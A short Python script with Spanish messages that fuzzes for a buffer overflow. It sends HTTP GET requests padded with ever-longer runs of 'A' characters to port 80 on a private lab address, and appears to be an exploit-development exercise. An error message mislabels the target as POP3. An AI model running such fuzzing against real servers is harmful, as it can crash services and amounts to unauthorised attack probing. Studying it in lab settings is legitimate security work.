
import pwn
import signal, sys, socket

def def_handler(sig, frame):
    print("\n\n[!] Se tenso... \n")
    sys.exit(-1)

signal.signal(signal.SIGINT, def_handler)

def buffer():
    buffer = ['A']
    padding = 100
    while len(buffer)< 50:
        buffer.append("A"*padding)
        padding+=200

    for strings in buffer:   
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('192.168.26.5', 80))
            print(f"enviando {len(strings)} bytes")
            datos = "GET"+ strings + 'HTTP/1.1\r\n\r\n'
            s.send(datos.encode())
            data = s.recv(1024)
            s.close()
        except:
            print("No se pudo conectar al pop3")
            sys.exit(-1)

        


if __name__ == '__main__':
    buffer() 